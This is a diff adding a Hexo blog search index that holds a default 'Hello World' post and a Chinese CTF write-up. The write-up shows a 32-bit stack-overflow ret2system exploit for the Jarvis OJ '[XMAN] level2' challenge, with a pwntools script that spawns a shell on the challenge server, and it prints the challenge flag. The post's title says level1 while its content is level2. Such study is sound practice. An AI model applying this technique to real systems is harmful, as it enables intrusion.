@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2024/02/04/hello-world/"/>
+      <url>/2024/02/04/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Android </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PWN学习—[XMAN] level1</title>
+      <link href="/2021/03/06/PWN%E5%AD%A6%E4%B9%A0%E2%80%94%5BXMAN%5D%20level2%20(x32)/"/>
+      <url>/2021/03/06/PWN%E5%AD%A6%E4%B9%A0%E2%80%94%5BXMAN%5D%20level2%20(x32)/</url>
+      
+        <content type="html"><![CDATA[<h2 id="一-XMAN-level-2-32位"><a href="#一-XMAN-level-2-32位" class="headerlink" title="一.[ XMAN ] level 2  32位"></a>一.[ XMAN ] level 2  32位</h2><p>练习平台：<a href="https://www.jarvisoj.com/challenges">https://www.jarvisoj.com/challenges</a></p><p>题目：[ XMAN ] level 2  32</p><span id="more"></span><p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/0.png" alt="image-20210306222247770"></p><h2 id="二-IDA分析"><a href="#二-IDA分析" class="headerlink" title="二.IDA分析"></a>二.IDA分析</h2><h3 id="2-1-查看程序逻辑"><a href="#2-1-查看程序逻辑" class="headerlink" title="2.1 查看程序逻辑"></a>2.1 查看程序逻辑</h3><p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/1.png" alt="image-20210306222725205"></p><ul><li>溢出存在</li></ul><p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/2.png" alt="image-20210306222740079"></p><ul><li>system函数存在 0x8048320</li></ul><p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/3.png" alt="image-20210306225445066"></p><ul><li>“&#x2F;bin&#x2F;sh”  存在</li></ul><p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/4.png" alt="image-20210306222858890"></p><h3 id="2-2-安全机制"><a href="#2-2-安全机制" class="headerlink" title="2.2  安全机制"></a>2.2  安全机制</h3><p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/5.png" alt="image-20210306225815656"></p><p>地址是固定的</p><h3 id="2-3-poc构造"><a href="#2-3-poc构造" class="headerlink" title="2.3 poc构造"></a>2.3 poc构造</h3><p>buf大小为0x88,   ebp 占用4个字节</p><p>shellcode +&#x3D;  ’a‘ * (0x88+4)         &#x2F;&#x2F;覆盖了缓冲区和ebp</p><p>system_addr +&#x3D;  system的地址（0x8048320）     &#x2F;&#x2F;system函数的地址</p><p>any_addr   +&#x3D; 0xdeadbeef       这个地址可以任意指定     &#x2F;&#x2F;这里随意指定一个地址作为system函数的返回地址。</p><p>bin_addr  +&#x3D;  0x804A024</p><p>关于0xdeadbeef的填充，不好理解。要参考函数的栈帧。</p><p>当return 到system函数时，会新起一个栈空间，就是</p><p>push ebp</p><p>move  ebp, esp</p><p>sub     esp,xxxxx</p><p>…………….</p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/6.png" alt="image-20210306231548189" style="zoom:80%;" /><p><img src="https://gitee.com/fatboyer/photo/raw/master/jarvioj/xman_level2_x32/7.png" alt="image-20210306234125822"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#pro = process(&#x27;./level1&#x27;)</span></span><br><span class="line">pro=remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>,<span class="number">9878</span>)</span><br><span class="line">data=pro.recv(<span class="number">100</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">shellcode= flat([<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>),p32(<span class="number">0x8048320</span>),p32(<span class="number">0xdeadbeef</span>),p32(<span class="number">0x0804a024</span>)])   <span class="comment">##对齐</span></span><br><span class="line">pro.send(shellcode)</span><br><span class="line">pro.interactive()</span><br><span class="line">pro.close()</span><br></pre></td></tr></table></figure><p>flag   CTF{1759d0cbd854c54ffa886cd9df3a3d52}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术研究 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
